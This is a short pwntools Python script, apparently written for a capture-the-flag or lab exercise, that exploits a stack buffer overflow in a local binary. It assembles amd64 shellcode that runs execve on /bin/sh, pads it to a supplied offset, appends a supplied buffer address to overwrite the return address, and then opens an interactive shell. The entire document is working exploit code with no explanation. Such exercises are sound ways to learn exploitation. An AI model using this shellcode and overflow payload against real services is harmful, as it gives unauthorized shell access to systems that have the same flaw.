from pwn import *

assert(args.OFFSET)
assert(args.ADDR)

offset = int(args.OFFSET, 10)
buf_addr  = int(args.ADDR, 16)

binfile = './a.out'
elf = ELF(binfile)
context.binary = binfile
context.terminal = ["tmux", "splitw", "-h"]

gs = '''
b main
c
'''

def start():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

shellcode = asm('''
     .intel_syntax noprefix
    .global _start
_start:
    xor rdx, rdx
    push rdx
    mov rax, 0x68732f6e69622f
    push rax 
    mov rdi, rsp
    push rdx
    push rdi 
    mov rsi, rsp 
    lea rax, [rdx + 59]
    syscall
''', arch = 'amd64')

# create payload
payload = shellcode
p = offset - len(payload)
payload += b'a' * p
payload += pack(buf_addr)

# start attack
io = start()
print(io.recvline())
io.sendline(payload)
io.clean()
io.interactive()